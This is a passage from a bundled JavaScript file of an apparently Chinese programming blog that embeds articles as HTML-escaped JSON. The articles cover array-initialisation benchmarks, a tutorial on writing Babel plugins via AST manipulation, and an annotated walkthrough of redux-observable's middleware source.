class=\\"hljs-number\\">10000000</span>).fill(<span class=\\"hljs-literal\\">null</span>).map(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">_, i</span>)=&gt;</span> i )\\n<span class=\\"hljs-built_in\\">console</span>.log(performance.now()-a)\\n<span class=\\"hljs-comment\\">// 2210ms</span>\\n\\n\\n<span class=\\"hljs-comment\\">// 三、</span>\\n<span class=\\"hljs-keyword\\">var</span> a=performance.now()\\n<span class=\\"hljs-keyword\\">var</span> arr=[...Array(<span class=\\"hljs-number\\">10000000</span>)].map(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">_, i</span>)=&gt;</span> i)\\n<span class=\\"hljs-built_in\\">console</span>.log(performance.now()-a)\\n<span class=\\"hljs-comment\\">// 2563ms</span>\\n\\n\\n<span class=\\"hljs-comment\\">// 四、</span>\\n<span class=\\"hljs-keyword\\">var</span> a=performance.now()\\n<span class=\\"hljs-keyword\\">var</span> arr=<span class=\\"hljs-built_in\\">Array</span>.from({ <span class=\\"hljs-attr\\">length</span>: <span class=\\"hljs-number\\">10000000</span> }, (_, i) =&gt; i)\\n<span class=\\"hljs-built_in\\">console</span>.log(performance.now()-a)\\n<span class=\\"hljs-comment\\">// 1843ms</span></code></pre></code></pre>\\n","toc":[{"anchor":"yi-xie-chang-yong-de-chu-shi-hua-shu-zu-wei-index-de-fang-fa-de-xing-neng-bi-jiao","level":4,"text":"一些常用的初始化数组为index的方法的性能比较"}],"relatedTags":null,"created_at":"2018-06-19","timeArr":[2018,5,19,0,0,0,0],"title":"初始化数组的性能比较","uuid":"1bc31bd290d4582fbd008d35949802c4ed8ba93e","summary":"<h4>一些常用的初始化数组为index的方法的性能比较</h4>\\n<p>注释为执行时间，这就是为什么循环推荐使用for循环了</p>\\n<p>(整段复制到控制台执行)</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 一、</span>\\n<span class=\\"hljs-keyword\\">var</span> a=performance.now()\\n<span class=\\"hljs-keyword\\">var</span> arr=[];\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;<span class=\\"hljs-number\\">10000000</span>;i++){\\n    arr[i]=...</code></pre>","slug":"chu-shi-hua-shu-zu-de-xing-neng-bi-jiao","sha":"933a48b25bde1a4296a5e153484a755778fd792c"}')},581:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"hui-gu\\">回顾</h2>\\n<p>在这一片文章中，我构建一个获取函数参数名的工具，是通过<code>esprima</code>去解析<code>AST</code>并对其进行分析判断。</p>\\n<p>通过对<code>AST</code>的分析，几乎能兼容所有函数和参数的写法，这是因为它是从语义上分析代码。</p>\\n<h2 id=\\"wen-ti\\">问题</h2>\\n<p>但使用的同时，也发现了3个问题，<strong>第1个是致命的</strong>。</p>\\n<ol>\\n<li><p>babel编译。</p>\\n<p> 当我们很爽的写着ES6函数的时候，<code>babel</code>会将你的参数格式彻底打乱。</p>\\n<p> 例如：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">let</span> sum=<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">a=<span class=\\"hljs-number\\">2</span>,b=<span class=\\"hljs-number\\">3</span></span>)=&gt;</span>{\\n   <span class=\\"hljs-built_in\\">console</span>.log(a+b)\\n }</code></pre></code></pre>\\n<p> 编译后，没有参数了，工具彻底失效。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">var</span> sum = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">sum</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n   <span class=\\"hljs-keyword\\">var</span> a = <span class=\\"hljs-built_in\\">arguments</span>.length &gt; <span class=\\"hljs-number\\">0</span> &amp;&amp; <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">0</span>] !== <span class=\\"hljs-literal\\">undefined</span> ? <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">0</span>] : <span class=\\"hljs-number\\">2</span>;\\n   <span class=\\"hljs-keyword\\">var</span> b = <span class=\\"hljs-built_in\\">arguments</span>.length &gt; <span class=\\"hljs-number\\">1</span> &amp;&amp; <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">1</span>] !== <span class=\\"hljs-literal\\">undefined</span> ? <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">1</span>] : <span class=\\"hljs-number\\">3</span>;\\n   <span class=\\"hljs-built_in\\">console</span>.log(a + b);\\n };</code></pre></code></pre>\\n</li>\\n<li><p>动态编译。</p>\\n<p> 必须要等到程序开始运行后才能工作，这意味着要将整个<code>esprima</code>库放入到项目中，除非你的项目中已经有依赖\\n <code>esprima</code>，否则为这个功能会带来额外的体积开销。</p>\\n</li>\\n<li><p>性能。</p>\\n<p> 由于是运行时才开始执行分析<code>AST</code>树，这意味着你的首屏时间又双叒叕增加了...</p>\\n</li>\\n</ol>\\n<h2 id=\\"jie-jue-fang-an\\">解决方案</h2>\\n<p>当前最需要解决的就是如果适应babel编译。</p>\\n<p>很显然，那就是要抢在babel编译之前，这就请出今天的主角，<strong>babel插件</strong>。</p>\\n<p>首先简要说明一下，babel是怎么编译你的代码的，<code>AST</code>树。</p>\\n<p>例如上面的函数</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> sum=<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">a=<span class=\\"hljs-number\\">2</span>,b=<span class=\\"hljs-number\\">3</span></span>)=&gt;</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(a+b)\\n}</code></pre></code></pre>\\n<p>babel会检测到是一个<code>ArrowFunctionExpression(箭头函数表达式)</code>，然后继续检测，\\n发现参数是<code>ExpressionStatement(表达式语句)</code>，符合修改的要求，于是构造出这两句的<code>AST</code>树</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> a = <span class=\\"hljs-built_in\\">arguments</span>.length &gt; <span class=\\"hljs-number\\">0</span> &amp;&amp; <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">0</span>] !== <span class=\\"hljs-literal\\">undefined</span> ? <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">0</span>] : <span class=\\"hljs-number\\">2</span>;\\n<span class=\\"hljs-keyword\\">var</span> b = <span class=\\"hljs-built_in\\">arguments</span>.length &gt; <span class=\\"hljs-number\\">1</span> &amp;&amp; <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">1</span>] !== <span class=\\"hljs-literal\\">undefined</span> ? <span class=\\"hljs-built_in\\">arguments</span>[<span class=\\"hljs-number\\">1</span>] : <span class=\\"hljs-number\\">3</span>;</code></pre></code></pre>\\n<p>其中一条<code>var a=...</code>的<code>AST</code>如下，具体可以这里尝试，<a href=\\"https://astexplorer.net/\\">https://astexplorer.net/</a></p>\\n<p><img src=\\"/article/img/AST-sample.png\\" alt=\\"./img/AST-sample.png\\"></p>\\n<p>并将其插入到当前的<code>BlockStatement(大括号作用域内)</code></p>\\n<p>检测和构造，就是babel，也是babel插件的核心。</p>\\n<h2 id=\\"ast-jie-dian-xiu-gai\\">AST节点修改</h2>\\n<p>正式开始，先从一个简单的结构看起，一个官方插件<code>@babel/plugin-transform-object-assign</code>，作用是将<code>Object.assign</code>\\n转换成<code>_extends</code>，这个<code>_extends</code>是一个预定义的方法。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> { declare } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\\"@babel/helper-plugin-utils\\"</span>;\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> declare(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">api</span> =&gt;</span> {\\n  api.assertVersion(<span class=\\"hljs-number\\">7</span>);\\n<span class=\\"hljs-comment\\">/*----------以上是确认版本判断功能是否存在---------*/</span>\\n  <span class=\\"hljs-keyword\\">return</span> {\\n    <span class=\\"hljs-attr\\">visitor</span>: {\\n      <span class=\\"hljs-attr\\">CallExpression</span>: <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">path, file</span>) </span>{\\n        <span class=\\"hljs-keyword\\">if</span> (path.get(<span class=\\"hljs-string\\">\\"callee\\"</span>).matchesPattern(<span class=\\"hljs-string\\">\\"Object.assign\\"</span>)) {\\n          path.node.callee = file.addHelper(<span class=\\"hljs-string\\">\\"extends\\"</span>);\\n        }\\n      },\\n    },\\n  };\\n});</code></pre></code></pre>\\n<p>从第6行开始</p>\\n<ul>\\n<li><p><code>visitor</code>指的是访问者模式，简单来说就是我们遍历<code>AST</code>树，每次遍历一个节点，都会进入visitor执行我们的代码。</p>\\n</li>\\n<li><p><code>CallExpression</code>说明我们要找的相关语义是<code>调用表达式</code>，它是一个函数，有2个参数<code>path</code>和<code>file</code>，</p>\\n</li>\\n<li><p><code>file</code>这里调用了addHelper方法，用的比较少，暂时搁着。</p>\\n</li>\\n<li><p><code>path</code>相当是一个连接对象，它里面的属性可以连接到各个我们需要的对象，例如如果我们要找到<code>CallExpression</code>对象本身，\\n那么就是进入<code>path.node</code>，如果要找它的父节点，进入<code>path.parent</code>等等</p>\\n<blockquote>\\n<p>个人理解：要尽快进入<code>path.node</code>，而不要在<code>path</code>上做过多判断甚至是遍历，\\n  因为它是一个包含了所有节点的path的对象，它的作用就是让我们快速到达想要找的节点，\\n  如果在<code>path</code>上面一层层寻找(我就这么干了！)，身心俱疲...</p>\\n</blockquote>\\n</li>\\n</ul>\\n<p>继续回到例子</p>\\n<ul>\\n<li><p><code>path.get(&quot;callee&quot;)</code>，因为这是一个<code>CallExpression</code>，它一定有一个<code>callee</code>属性，\\n  通过<code>.get</code>可以快速查找，相当于<code>path.node.callee</code>。</p>\\n</li>\\n<li><p><code>.matchesPattern(&quot;Object.assign&quot;)</code>字面意思，匹配到<code>Object.assign</code>这个字样。</p>\\n</li>\\n<li><p><code>path.node.callee = file.addHelper(&quot;extends&quot;)</code>就是将<code>callee</code>属性重新设置成<code>_extend</code>，\\n这里的<code>file.addHelper(&quot;extends&quot;)</code>返回的也是一个<code>AST</code>对象，<code>Identifier{type:&quot;Identifier &quot;,name:&quot;_extend&quot;}</code>，\\n这是一个标识符，像变量，参数，属性的名称等都是标识符。</p>\\n<p>  记住，要在<code>AST</code>树上插入的内容一定也要是<code>AST</code>对象。</p>\\n</li>\\n</ul>\\n<p>看到吗，就这么多，很好理解吧，因为这里只是修改了一个属性，并没有增加。</p>\\n<h2 id=\\"ast-jie-dian-zeng-jia\\">AST节点增加</h2>\\n<p>在这一块，我被困扰了好几个小时，主要还是概念太过缺失，现在总结起来。</p>\\n<ol>\\n<li><p>每一个AST节点都是一个对象，这个对象内部有必须的属性(type是必须的)，也有非必须的属性，例如：</p>\\n<p> <code>ArrayExpression(数组表达式)</code>，也就是数组，必须的属性只有1个，<code>elements</code>，它的元素</p>\\n<p> 那么就可以想象一下，它的最简单<code>AST</code>树结构就是</p>\\n<pre><code><pre class=\\"hljs\\"><code> {\\n   type:&quot;ArrayExpression&quot;,\\n   elements:[]\\n }</code></pre></code></pre><p> 但查找时会发现，默认的树还有其他许多属性，例如<code>start</code>,<code>loc</code>等等，这些我们在创建的时候，可以不必理会。</p>\\n</li>\\n<li><p>创建方式有多种，分为2类，使用工具创建和不使用工具创建。</p>\\n<p> 当然，最开始我是不使用工具的，当时写一个对象结构里面的<code>key</code>属性是字符串，<code>value</code>属性是数组(并且有的有可能多层嵌套)，\\n 然后开始一个个节点对象创建，递归，遍历，写啊写，写完执行，失败，好吧，一层一层的剥开调试...这就是写bug的正确方式。</p>\\n<p> 好吧，<code>ctrl+a -&gt; del</code>，这里只讲我使用的方式。</p>\\n<p> 安装<code>@babel/core</code>，引入<code>import {template,types as t} from &quot;@babel/core&quot;</code></p>\\n<ul>\\n<li><p><code>template</code></p>\\n<p>用来创建模板的，能少写很多东西，例如：<code>template(&quot;let x=SOMEVALUE&quot;)</code>\\n这里只需要在后面传入<code>SOMEVALUE(要大写)</code>的值，就会自动创建出<code>let x=xxxx</code>这个表达式的<code>AST</code>对象。</p>\\n</li>\\n<li><p><code>types</code></p>\\n<p>用来创建单个节点对象的。\\n或许我只想简单创建一个字符串，那么就是<code>t.stringLiteral(&quot;这里是要创建的字符串&quot;)</code>，</p>\\n<p>创建一个数组，那么是<code>t.arrayExpression(elements)</code>，</p>\\n<p>也就是使用<code>t</code>的节点名称方法，传入这个节点必须的属性就可以了，你只需要了解你的代码对应的语义，\\n最后拼接，例如 一个有3个字符串作为元素的数组：</p>\\n<p><code>t.arrayExpression([t.stringLiteral(&quot;a&quot;),t.stringLiteral(&quot;b&quot;),t.stringLiteral(&quot;c&quot;)])</code></p>\\n<p>简洁高效。</p>\\n</li>\\n</ul>\\n</li>\\n</ol>\\n<h2 id=\\"zong-jie\\">总结</h2>\\n<p>关于AST的操作还有很多，例如删除，替换...具体可以看<code>bable-handbook</code>，这篇文章说的修改和增加，内容不深，主要是让我们对AST\\n的结构，并且是如何通过它去创建babel插件能有一个概念，接下来的更多发掘就靠自己的探索了。</p>\\n","toc":[{"anchor":"hui-gu","level":2,"text":"回顾"},{"anchor":"wen-ti","level":2,"text":"问题"},{"anchor":"jie-jue-fang-an","level":2,"text":"解决方案"},{"anchor":"ast-jie-dian-xiu-gai","level":2,"text":"AST节点修改"},{"anchor":"ast-jie-dian-zeng-jia","level":2,"text":"AST节点增加"},{"anchor":"zong-jie","level":2,"text":"总结"}],"relatedTags":null,"created_at":"2018-09-20","timeArr":[2018,8,20,0,0,0,0],"title":"从零开始构建babel插件","uuid":"1fe9476aee8ec9e615a5ea77d64b322605aa28f8","summary":"<h4>回顾</h4>\\n<p>在这一片文章中，我构建一个获取函数参数名的工具，是通过<code>esprima</code>去解析<code>AST</code>并对其进行分析判断。</p>\\n<p>通过对<code>AST</code>的分析，几乎能兼容所有函数和参数的写法，这是因为它是从语义上分析代码。</p>\\n<h4>问题</h4>\\n<p>但使用的同时，也发现了3个问题，<strong>第1个是致命的</strong>。</p>\\n<ol>\\n<li>babel编译。</li>\\n</ol>\\n<p>...</p>","slug":"cong-ling-kai-shi-gou-jian-babel-cha-jian","sha":"c6aabf028612373f374ca39935fa4a385595f224"}')},582:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"yue-du-qian-ti\\">阅读前提</h2>\\n<ol>\\n<li>有rxjs基础，对<code>Observable</code>, <code>Subject</code>,<code>pipe</code>和一些操作符(例如<code>filter</code>,<code>map</code>,<code>merge</code>,<code>mergeMap</code>)执行流程有基本了解，最起码遇到不清楚有去查阅的动力</li>\\n<li>比较熟悉<code>redux</code>中间件的写法，否则像<code>createEpicMiddleware.js</code>中的这一段会搞不清楚<pre><code><pre class=\\"hljs\\"><code> return next =&gt; {\\n   return action =&gt; {</code></pre></code></pre> 关于redux也可以查阅我之前写的<a href=\\"https://github.com/stonehank/sourcecode-analysis/tree/master/source-code.redux\\">redux源码注释</a></li>\\n</ol>\\n<h2 id=\\"mu-lu-jie-gou\\">目录结构</h2>\\n<pre><code><pre class=\\"hljs\\"><code>src/\\n├──utils/\\n    ├──console.js\\n├── ActionsObservable.js    // 自定义的类，继承Observable, 绑定了操作符的链式调用\\n├── combineEpics.js         // \\n├── createEpicMiddleware.js // 调用可生成redux的中间件, 通过run绑定需要执行的流\\n├── index.js                // 对外接口\\n├── operators.js            // 自定义的流操作方法, 目前只有ofType\\n├── StateObservable.js      // 自定义的类，继承Observable, 用于保存当前state</code></pre></code></pre><h2 id=\\"yuan-ma-fen-xi\\">源码分析</h2>\\n<p>index.js：公开接口，略</p>\\n<hr>\\n<h3 id=\\"actionobservablejs\\">ActionObservable.js</h3>\\n<p>继承了<code>Observable</code>类</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">ActionsObservable</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Observable</span></span></code></pre></code></pre>\\n<p>定义了两个静态函数，用调用的对象包装了原来的<code>of</code>和<code>from</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  <span class=\\"hljs-keyword\\">static</span> <span class=\\"hljs-keyword\\">of</span>(...actions) {\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-keyword\\">this</span>(<span class=\\"hljs-keyword\\">of</span>(...actions));\\n  }\\n  <span class=\\"hljs-keyword\\">static</span> <span class=\\"hljs-keyword\\">from</span>(actions, scheduler) {\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-keyword\\">this</span>(<span class=\\"hljs-keyword\\">from</span>(actions, scheduler));\\n  }</code></pre></code></pre>\\n<p>构造函数，定义了<code>source</code>属性为参数，这个属性用来绑定操作符的链式调用</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  <span class=\\"hljs-keyword\\">constructor</span>(actionsSubject) {\\n    <span class=\\"hljs-keyword\\">super</span>();\\n    <span class=\\"hljs-keyword\\">this</span>.source = actionsSubject;\\n  }</code></pre></code></pre>\\n<p>这里重写了父类(Observable)的<code>lift</code>，先看一下父类的<code>lift</code>是怎样的</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> observable = <span class=\\"hljs-keyword\\">new</span> Observable();\\nobservable.source = <span class=\\"hljs-keyword\\">this</span>;\\nobservable.operator = operator;\\n<span class=\\"hljs-keyword\\">return</span> observable;</code></pre></code></pre>\\n<p>可以看到改动就在于原来的用<code>new Observable</code>，这里使用<code>new ActionObservable()</code>，其他都是一模一样，\\n封装成<code>ActionObservable</code>类的意义，统一类型，方便后面的链式绑定</p>\\n<p><code>lift</code>在<code>pipe</code>的时候会用到，其实这都是rxjs源码调用的方式()</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>lift(operator) {\\n <span class=\\"hljs-keyword\\">const</span> observable = <span class=\\"hljs-keyword\\">new</span> ActionsObservable(<span class=\\"hljs-keyword\\">this</span>);\\n observable.operator = operator;\\n <span class=\\"hljs-keyword\\">return</span> observable;\\n}</code></pre></code></pre>\\n<p>定义了一个操作方法<code>ofType</code>，具体见operators</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  ofType(...keys) {\\n    <span class=\\"hljs-keyword\\">return</span> ofType(...keys)(<span class=\\"hljs-keyword\\">this</span>);\\n  }</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"combineepicsjs\\">combineEpics.js</h3>\\n<p>将多个epic合并成1个epic，就是分别执行每一个epic(绑定用户定义的操作符)，然后将每一个结果的流用merge合并</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 引入merge</span>\\n<span class=\\"hljs-keyword\\">import</span> { merge } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'rxjs\'</span>;\\n\\n<span class=\\"hljs-comment\\">/**\\n  Merges all epics into a single one.\\n */</span>\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">const</span> combineEpics = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">...epics</span>) =&gt;</span> {\\n  <span class=\\"hljs-comment\\">// 通过merge操作符合并多个epic执行后的output$流</span>\\n  <span class=\\"hljs-comment\\">// ...epics是多个epic</span>\\n  <span class=\\"hljs-keyword\\">const</span> merger = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">...args</span>) =&gt;</span> merge(\\n    ...epics.map(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">epic</span> =&gt;</span> {\\n      <span class=\\"hljs-comment\\">// 执行每一个epic，确保有返回值，此处执行就是绑定了用户自定义操作符的步骤</span>\\n      <span class=\\"hljs-keyword\\">const</span> output$ = epic(...args);\\n      <span class=\\"hljs-keyword\\">if</span> (!output$) {\\n        <span class=\\"hljs-keyword\\">throw</span> <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-built_in\\">TypeError</span>(<span class=\\"hljs-string\\">`combineEpics: one of the provided Epics \\"<span class=\\"hljs-subst\\">${epic.name || <span class=\\"hljs-string\\">\'&lt;anonymous&gt;\'</span>}</span>\\" does not return a stream. Double check you\\\\\'re not missing a return statement!`</span>);\\n      }\\n      <span class=\\"hljs-comment\\">// 返回结果，最后进行merge合并</span>\\n      <span class=\\"hljs-keyword\\">return</span> output$;\\n    })\\n  );\\n\\n  <span class=\\"hljs-comment\\">// Technically the `name` property on Function\'s are supposed to be read-only.</span>\\n  <span class=\\"hljs-comment\\">// While some JS runtimes allow it anyway (so this is useful in debugging)</span>\\n  <span class=\\"hljs-comment\\">// some actually throw an exception when you attempt to do so.</span>\\n  <span class=\\"hljs-keyword\\">try</span> {\\n    <span class=\\"hljs-built_in\\">Object</span>.defineProperty(merger, <span class=\\"hljs-string\\">\'name\'</span>, {\\n      <span class=\\"hljs-attr\\">value</span>: <span class=\\"hljs-string\\">`combineEpics(<span class=\\"hljs-subst\\">${epics.map(epic =&gt; epic.name || <span class=\\"hljs-string\\">\'&lt;anonymous&gt;\'</span>).join(<span class=\\"hljs-string\\">\', \'</span>)}</span>)`</span>,\\n    });\\n  } <span class=\\"hljs-keyword\\">catch</span> (e) {}\\n\\n  <span class=\\"hljs-keyword\\">return</span> merger;\\n};</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"createepicmiddlewarejs\\">createEpicMiddleware.js</h3>\\n<p>一、提示目前参数不在接受<code>rootEpic</code>，而是使用<code>epicMiddleware.run(rootEpic)</code>，这里<code>epicMiddleware</code>就是执行<code>createEpicMiddleware</code>的返回值</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">createEpicMiddleware</span>(<span class=\\"hljs-params\\">options = {}</span>) </span>{\\n  <span class=\\"hljs-keyword\\">if</span> (process.env.NODE_ENV !== <span class=\\"hljs-string\\">\'production\'</span> &amp;&amp; <span class=\\"hljs-keyword\\">typeof</span> options === <span class=\\"hljs-string\\">\'function\'</span>) {\\n    <span class=\\"hljs-keyword\\">throw</span> <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-built_in\\">TypeError</span>(<span class=\\"hljs-string\\">\'Providing your root Epic to `createEpicMiddleware(rootEpic)` is no longer supported, instead use `epicMiddleware.run(rootEpic)`\\\\n\\\\nLearn more: https://redux-observable.js.org/MIGRATION.html#setting-up-the-middleware\'</span>);\\n  }\\n  <span class=\\"hljs-comment\\">/*...*/</span>\\n}</code></pre></code></pre>\\n<p>二、这一定义了几个重要变量(流)，这里一个重要问题</p>\\n<pre><code><pre class=\\"hljs\\"><code>1. rxjs内部的source是什么(在ActionObservable内部出现)\\n2. rxjs内部的operator是什么(在ActionObservable内部出现)\\nA：source定义了操作符执行的流向，operator定义了操作符是什么操作符，这两者结合使用来进行链式绑定</code></pre></code></pre><p>接着看注释</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">createEpicMiddleware</span>(<span class=\\"hljs-params\\">options = {}</span>) </span>{\\n  <span class=\\"hljs-comment\\">/*...*/</span>\\n  <span class=\\"hljs-comment\\">// 定义一个Subject，绑定内部操作流，通过调用epic$.next()，也就是`epicMiddleware.run`来初始化action$的绑定</span>\\n  <span class=\\"hljs-keyword\\">const</span> epic$ = <span class=\\"hljs-keyword\\">new</span> Subject();\\n  <span class=\\"hljs-keyword\\">let</span> store;\\n  <span class=\\"hljs-comment\\">// 作为redux的中间件，其中epicMiddleware是返回值作为外部API</span>\\n  <span class=\\"hljs-keyword\\">const</span> epicMiddleware = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">_store</span> =&gt;</span> {\\n    <span class=\\"hljs-comment\\">// 当在开发环境并且多次使用不同的 createEpicMiddleware返回值，会提出警告(避免重复执行多次)</span>\\n    <span class=\\"hljs-keyword\\">if</span> (process.env.NODE_ENV !== <span class=\\"hljs-string\\">\'production\'</span> &amp;&amp; store) {\\n      <span class=\\"hljs-comment\\">// https://github.com/redux-observable/redux-observable/issues/389</span>\\n      <span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-string\\">\'./utils/console\'</span>).warn(<span class=\\"hljs-string\\">\'this middleware is already associated with a store. createEpicMiddleware should be called for every store.\\\\n\\\\nLearn more: https://goo.gl/2GQ7Da\'</span>);\\n    }\\n    store = _store;\\n    <span class=\\"hljs-comment\\">// 定义一个Subject，绑定了队列调度器 (后面这个用来绑定所有操作流)</span>\\n    <span class=\\"hljs-keyword\\">const</span> actionSubject$ = <span class=\\"hljs-keyword\\">new</span> Subject().pipe(\\n      <span class=\\"hljs-comment\\">// todo 调度器，看了一些资料，还有有点模糊</span>\\n      observeOn(queueScheduler)\\n    );\\n    <span class=\\"hljs-comment\\">//  定义一个Subject，绑定了队列调度器 (后面这个用来对比当前store，防止重复渲染)</span>\\n    <span class=\\"hljs-keyword\\">const</span> stateSubject$ = <span class=\\"hljs-keyword\\">new</span> Subject().pipe(\\n      observeOn(queueScheduler)\\n    );\\n    <span class=\\"hljs-comment\\">// 定义一个ActionsObservable，用来绑定用户定义的操作流</span>\\n    <span class=\\"hljs-keyword\\">const</span> action$ = <span class=\\"hljs-keyword\\">new</span> ActionsObservable(actionSubject$);\\n    <span class=\\"hljs-comment\\">// 定义一个StateObservable，内部改写了Observable的_subscribe方法，并且让stateSubject$绑定了value对比操作，就是简单的引用对比`===`</span>\\n    <span class=\\"hljs-keyword\\">const</span> state$ = <span class=\\"hljs-keyword\\">new</span> StateObservable(stateSubject$, store.getState());\\n\\n    <span class=\\"hljs-comment\\">/*...*/</span>\\n  }\\n}</code></pre></code></pre>\\n<p>三、这里是核心，所有流和操作符的绑定就是在此内部进行</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">createEpicMiddleware</span>(<span class=\\"hljs-params\\">options = {}</span>) </span>{\\n  <span class=\\"hljs-comment\\">/*...*/</span>\\n\\n  <span class=\\"hljs-comment\\">// pipe操作符</span>\\n<span class=\\"hljs-keyword\\">const</span> result$ = epic$.pipe(\\n  <span class=\\"hljs-comment\\">// 对发射源逐个处理</span>\\n  map(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">epic</span> =&gt;</span> {\\n    <span class=\\"hljs-comment\\">// 如果配置有 dependencies 就放置到第三个参数中</span>\\n    <span class=\\"hljs-keyword\\">const</span> output$ = <span class=\\"hljs-string\\">\'dependencies\'</span> <span class=\\"hljs-keyword\\">in</span> options\\n      ? epic(action$, state$, options.dependencies)\\n      : epic(action$, state$);\\n    <span class=\\"hljs-comment\\">// 无返回值，报错，应该要返回一个不同的流</span>\\n    <span class=\\"hljs-keyword\\">if</span> (!output$) {\\n      <span class=\\"hljs-keyword\\">throw</span> <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-built_in\\">TypeError</span>(<span class=\\"hljs-string\\">`Your root Epic \\"<span class=\\"hljs-subst\\">${epic.name || <span class=\\"hljs-string\\">\'&lt;anonymous&gt;\'</span>}</span>\\" does not return a stream. Double check you\\\\\'re not missing a return statement!`</span>);\\n    }\\n    <span class=\\"hljs-comment\\">// output$ 是一个ActionObservable类型的流</span>\\n    <span class=\\"hljs-keyword\\">return</span> output$;\\n  }),\\n  <span class=\\"hljs-comment\\">// 对所有外部流，绑定队列调度并且使用mergeMap重新subscribe</span>\\n  mergeMap(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">output$</span> =&gt;</span>\\n    <span class=\\"hljs-keyword\\">from</span>(output$).pipe(\\n      subscribeOn(queueScheduler),\\n      observeOn(queueScheduler)\\n    )\\n  )\\n);\\n\\n    <span class=\\"hljs-comment\\">/*...*/</span>\\n}\\n</code></pre></code></pre>\\n<p>四、epic执行主要流程，<code>dispatch(action$)</code>--&gt; <code>actionSubject$.next(action)</code>--&gt;经过一系列操作符--&gt;最后到达底层<code>dispatch(state)</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">createEpicMiddleware</span>(<span class=\\"hljs-params\\">options = {}</span>) </span>{\\n<span class=\\"hljs-comment\\">/*...*/</span>\\n\\n<span class=\\"hljs-comment\\">// 订阅 dispatch，此处将dispath作为流执行的最底层</span>\\nresult$.subscribe(store.dispatch);\\n\\n<span class=\\"hljs-comment\\">// 返回的格式是按照redux中间件的格式</span>\\n<span class=\\"hljs-comment\\">// 里面的内容都是运行时redux里dispatch后会执行的流程</span>\\n<span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">next</span> =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action</span> 